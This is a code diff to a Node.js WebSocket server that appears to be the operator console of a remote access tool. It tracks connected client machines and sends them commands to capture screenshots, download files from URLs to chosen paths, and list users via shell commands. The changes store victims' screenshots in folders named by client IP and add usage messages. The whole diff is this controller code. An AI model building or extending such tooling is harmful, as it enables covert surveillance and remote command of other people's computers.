@@ -1,5 +1,6 @@
 const WebSocket = require('ws');
 const colors = require('colors');
+var mkdirp = require('mkdirp');
 require('events').EventEmitter.setMaxListeners = 1;
 var workingDir = "";
 sessions = [];
@@ -19,7 +20,8 @@ const rl = readline.createInterface({
 wss.on('connection', function connection(ws) {
 	sessions.push(ws);
 	currentSession = sessions.length - 1;
-	console.log("[".white + "+".blue + "] Connected to client : ".white + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + " !");
+	sessions[currentSession].clientAddress = ws._socket.remoteAddress.replace("::ffff:", "");
+	console.log("[".bold + "+".green + "] Connected to client : ".bold + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + " !".bold);
 	ws.on('message', function incoming(message) {
 
 		if (message.startsWith("hello")) {
@@ -30,13 +32,17 @@ wss.on('connection', function connection(ws) {
 			ws.send("#pwd");
 		} else if (message.startsWith("##SCREENSHOT##")) {
 			var base64Data = message.replace("##SCREENSHOT##", "").replace(/^data:image\/png;base64,/, "");
-			require("fs").writeFile("screenshots/" + Date.now() + ".png", base64Data, 'base64', function (err) {});
+			mkdirp('screenshots/' + sessions[currentSession].clientAddress + "/", function(err) { 
+
+				require("fs").writeFile("screenshots/" + sessions[currentSession].clientAddress + "/" + Date.now() + ".png", base64Data, 'base64', function (err) {});
+
+			});
 		} else {
 			console.log(message.grey);
 		}
 	});
 	ws.on('close', function (reasonCode, description) {
-		console.log((new Date()) + ' Peer ' + ws.remoteAddress + ' disconnected.');
+		console.log((new Date()) + ' Peer ' + ws.remoteAddress + ' disconnected !');
 	});
 
 });
@@ -50,7 +56,7 @@ function suggestions(line) {
 rl.on('line', (line) => {
 	var msg = line.trim();
 	if (msg == "screenshot") {
-		console.log("[".white + "+".blue + "]".white + "Uploading screenshot (May exceed 10MO, please be patient)...".bold);
+		console.log("[".bold + "+".blue + "] Uploading screenshot (May exceed 10MO, please be patient)...".bold);
 		sessions[currentSession].send(msg);
 	} else if (msg.startsWith("download_url")) {
 		if (msg.split(" ").length == 4) {
@@ -65,6 +71,8 @@ rl.on('line', (line) => {
 				console.log("[".white + "+".red + "]".white + " Wrong URL !");
 				rl.prompt();
 			}
+		}else{
+			console.log("[".white + "+".red + "]".white + " Too few arguments : ".red + "Usage : ".white + "download_url <url> <filename> <path>");
 		}
 	}else if(msg == "list_users"){
 		sessions[currentSession].send("cd /Users & dir");
@@ -92,7 +100,7 @@ function ValidURL(str) {
 	  '(\?[;&a-z\d%_.~+=-]*)?'+ // query string
 	  '(\#[-a-z\d_]*)?$','i'); // fragment locater
 	if(!pattern.test(str)) {
-	  alert("Please enter a valid URL.");
+	  console.log("[".white + "+".red + "]".white + " Wrong URL !");
 	  return false;
 	} else {
 	  return true;
